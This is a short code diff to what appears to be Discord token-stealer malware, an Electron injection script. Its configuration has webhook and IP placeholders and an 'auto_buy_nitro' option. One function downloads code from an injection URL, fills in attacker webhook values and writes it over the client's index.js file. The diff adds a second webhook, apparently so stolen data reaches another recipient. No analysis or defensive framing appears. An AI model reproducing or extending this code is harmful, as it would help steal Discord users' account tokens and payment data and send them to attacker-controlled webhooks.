@@ -7,6 +7,7 @@ const { BrowserWindow, session } = require('electron');
 
 const config = {
   webhook: '%WEBHOOK%', 
+  webhook: '%WEBHOOK2%',
   ip: '%IP%',
   auto_buy_nitro: false, 
   ping_on_run: false, 
@@ -420,6 +421,7 @@ async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
         res.replace('%WEBHOOK%', '${config.webhook}')
+        res.replace('%WEBHOOK2%', '${config.webhook}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
